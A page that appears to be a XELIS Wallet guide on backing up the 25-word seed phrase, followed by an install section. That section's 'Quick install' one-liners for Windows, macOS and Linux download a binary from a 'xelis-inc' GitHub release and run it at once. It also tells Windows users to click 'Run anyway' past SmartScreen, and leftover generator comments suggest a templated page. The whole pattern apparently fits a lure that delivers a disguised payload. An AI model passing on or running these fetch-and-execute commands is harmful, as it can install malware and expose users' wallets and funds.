![XELIS Wallet backup: seed phrase and keys file](assets/banner-article.png)
# XELIS Wallet backup: seed phrase and keys file

Capture all 25 words once, store them offline and test the copy.

## Downloads - Backup

<p align="center"><a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`xelis-wallet-desktop-v0.2.1-Windows.exe`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`xelis-wallet-desktop-v0.2.1-Macos.dmg`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`xelis-wallet-desktop-v0.2.1-Linux.zip`](https://github.com/xelis-inc/xelis-wallet-desktop/releases/download/v0.2.1/xelis-wallet-desktop-v0.2.1-Linux.zip) |

You do not need a new download to back up an existing wallet. If you are reinstalling to check a backup, use the [current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1) so the version that restores the phrase is the one you actually run.

> A backup you have never restored is a belief, not a backup. The only proof is a restore that produces the same address.

Backing up XELIS Wallet means writing down the 25-word recovery phrase exactly, in order, and keeping a second copy somewhere else. The phrase is the wallet: it recreates the keys and therefore the address and funds. The local password and the encrypted wallet file are conveniences that save you re-entering the phrase on this machine, not the backup itself.

<!-- ARTICLE-BODY-BEGIN -->
## Two things you can save, one you must

The phrase reconstructs the wallet anywhere. The encrypted wallet file, protected by your local password, reopens the same data on the same or another install, but only with that password, and it does not replace the phrase. If the two ever disagree, the phrase wins, because it is generated from the keys themselves rather than from a file copy.

## Write the phrase correctly the first time

1. Open the wallet's settings area and look for the recovery phrase view if your build has one, or use the phrase you recorded when the wallet was created.
2. Write the 25 words by hand, numbered, on paper or a metal plate.
3. Read them back against the screen word by word, including word 25.
4. Make a second copy and store it in a different physical place from the first.
5. Destroy any screenshot, note or chat message that contains the words.

Word order and spelling both matter, and a single wrong word produces a different, empty wallet rather than an error. There is no partial restore to fall back on, so the check in step 3 is the whole safeguard. The same capture step is described from the creation side in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-create-setup-password.md">create a XELIS Wallet wallet</a>.

## Store the copy where a browser cannot reach it

Paper in a drawer is weak against fire and water. Metal is durable but obvious if left in a wallet. A password manager is convenient and encrypted, yet it puts the phrase on a device that is online, which is the one place a phrase-stealing program looks first. Choose a method whose failure mode you can live with, then split the risk: one copy at home, one somewhere you would still have access after a house fire.

The common mistakes are worth naming because they are so frequent: photographing the screen, emailing the words to yourself, keeping the only copy next to the computer, and typing the phrase into a website that offered to "check" it. <a href="https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-seed-phrase-storage-mistakes.md">Seed phrase storage mistakes</a> covers each one with the fix.

## Prove the backup before you need it

Take the second copy, install the <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1">current XELIS Wallet release</a> on another machine or a fresh user account, and restore from the phrase. If the restored wallet shows the same address, the backup works. If it shows a different address, stop and find out why before you move any funds; usually a word was misread or the phrase belongs to another wallet.

If you have never restored before, the step-by-step path is in <a href="https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-restore-new-computer.md">restore a XELIS Wallet on a new computer</a>, which starts from a fresh install and ends at the same address.

Do this once, on a quiet day, and the backup becomes a fact. Waiting until a laptop dies is how people discover a missing word.

## FAQ

### Do I need both the phrase and the wallet file?

The phrase is enough on its own. The wallet file is a convenience that needs its password, so it is not a substitute when the machine is gone.

### Where should I keep a paper copy?

Somewhere physically separate from the computer and from the second copy, ideally in a container that survives water and fire.

### Is a password manager safe for a seed phrase?

It is encrypted but online, which is the exposure you are trying to avoid. If you use one, treat it as a second copy, never the only one.

### Can I change the phrase later?

No. The phrase is derived from the wallet's keys; changing it means creating a new wallet and moving the funds.

### What if I already lost one word?

A phrase with a missing word restores a different wallet. Without the complete phrase there is no repair path, so a fresh wallet is the only way forward.

<!-- ARTICLE-BODY-END -->

## How to install XELIS Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). Commands, verify commands, sizes and hashes come from install_commands.generate (A9-A11); drop the size in brackets when unknown. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Windows.exe">xelis-wallet-desktop-v0.2.1-Windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Verify the download (77.6 MB): run the command below and compare the result with SHA-256 `56dc416e2f85cad18496f2be3c1f909df4b0eca610341fa17ba6273335ae7c09`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`certutil -hashfile xelis-wallet-desktop-v0.2.1-Windows.exe SHA256`

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Macos.dmg">xelis-wallet-desktop-v0.2.1-Macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Verify the download (62.7 MB): run the command below and compare the result with SHA-256 `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352`. For a ZIP, also compare the extracted file with the .sha256 inside the archive.

`shasum -a 256 xelis-wallet-desktop-v0.2.1-Macos.dmg`

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip && unzip -oq app.zip -d w && B=$(find w -name '*xelis*wallet*' -type f|head -1) && chmod +x "$B" && "$B"
```

Manual install:
1. Download <a href="https://github.com/xelis-inc/xelis-wallet-desktop/releases/latest/download/xelis-wallet-desktop-v0.2.1-Linux.zip">xelis-wallet-desktop-v0.2.1-Linux.zip</a>.
2. Extract the archive: `unzip app.zip`.
3. Make the extracted wallet binary executable: `chmod +x <file>`.
4. Run it: `./xelis-wallet`.

Verify the download (21.5 MB): run the command below and compare the result with SHA-256 `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907`. The archive also carries a `.sha256` file; compare the extracted binary against that value too.

`sha256sum xelis-wallet-desktop-v0.2.1-Linux.zip`

<!-- INSTALL-END -->

## Related guides
- [Store a XELIS Wallet seed phrase safely](https://github.com/xelis-inc/xelis-wallet-privacy/blob/main/xelis-wallet-seed-phrase-storage-mistakes.md)
- [Restore a XELIS Wallet on a new computer](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-restore-new-computer.md)
- [Create a XELIS Wallet wallet](https://github.com/xelis-inc/xelis-wallet-setup/blob/main/xelis-wallet-create-setup-password.md)
- [What the XELIS Wallet password protects](https://github.com/xelis-inc/xelis-wallet-help/blob/main/xelis-wallet-password-encryption-local-data.md)
- [Current XELIS Wallet release](https://github.com/xelis-inc/xelis-wallet-desktop/releases/tag/v0.2.1)
